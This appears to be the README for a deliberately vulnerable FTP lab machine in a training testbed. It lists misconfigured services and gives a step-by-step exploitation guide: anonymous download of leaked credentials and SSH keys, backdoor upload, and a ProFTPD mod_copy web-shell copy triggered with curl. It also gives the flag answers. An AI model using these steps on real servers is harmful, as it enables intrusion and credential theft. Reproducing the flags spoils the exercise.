# 🏢 VulnCorp — Machine 3: dmz-ftp01 (FTP Server)

> ⚠️ **FOR EDUCATIONAL / LAB USE ONLY — NEVER EXPOSE TO THE INTERNET**

Machine 3 in the VulnCorp Enterprise testbed simulates an FTP server in the **DMZ Zone (`10.10.10.30`)** featuring **vsftpd Anonymous Upload/Write**, **ProFTPD `mod_copy` RCE (CVE-2015-3306 simulation)**, and leaked internal assets.

---

## 🚀 Quick Start (One-Command Deploy)

Run this on your **Debian 13 VM** (`10.10.10.30`):

```bash
git clone https://github.com/YOUR_GITHUB_USERNAME/webserver.git
cd webserver/machines/dmz-ftp01

chmod +x deploy.sh
sudo ./deploy.sh
```

Or deploy directly via Docker Compose:
```bash
docker compose up -d --build
```

---

## 📡 Exposed Ports & Services

| Service | Port | Description | Vulnerability |
|---------|------|-------------|---------------|
| **vsftpd** | `21` | vsftpd 2.3.4 banner | **Anonymous Write Enabled** (`anon_upload_enable=YES`) |
| **ProFTPD** | `2121` | ProFTPD Standalone | **`mod_copy` RCE** (`SITE CPFR` / `SITE CPTO`) |
| **HTTP** | `80` | Apache Web Server | Web root can be written to via ProFTPD mod_copy |
| **SSH** | `2222` | OpenSSH | Root login allowed |
| **FTP Passive** | `40000-40100` | Passive data ports | Data transfer |

---

## 🔍 Attack Vectors & Exploitation Guide

### 1. Anonymous FTP Login & Information Gathering
```bash
ftp 10.10.10.30 21
# Name: anonymous
# Password: <press enter>
ftp> cd pub
ftp> ls -la
# Download sensitive files:
ftp> get network_map.txt
ftp> get db_credentials.txt
ftp> get employee_list.csv
ftp> cd keys
ftp> get backup_rsa
```

### 2. Anonymous Write (File Upload)
```bash
ftp 10.10.10.30 21
ftp> cd pub
ftp> put my_backdoor.sh
```

### 3. ProFTPD `mod_copy` Unauthenticated File Copy (RCE)
```bash
telnet 10.10.10.30 2121
SITE CPFR /var/ftp/pub/my_backdoor.php
SITE CPTO /var/www/html/shell.php
# Then execute via web:
curl http://10.10.10.30/shell.php
```

---

## 🏆 Flags

- **Anonymous FTP Write Flag:** `/var/ftp/pub/flag1.txt` (`VULN{anon_ftp_wr1t3}`)
- **Leaked SSH Key Flag:** `/var/ftp/pub/keys/flag.txt` (`VULN{ssh_k3y_l3ak3d}`)
- **Root Flag:** `/root/root.txt` (`VULN{ftp_s3rv3r_r00t3d_m4ch1n3_3}`)

---

## 🧹 Teardown & Cleanup

```bash
docker compose down --rmi all --volumes
```
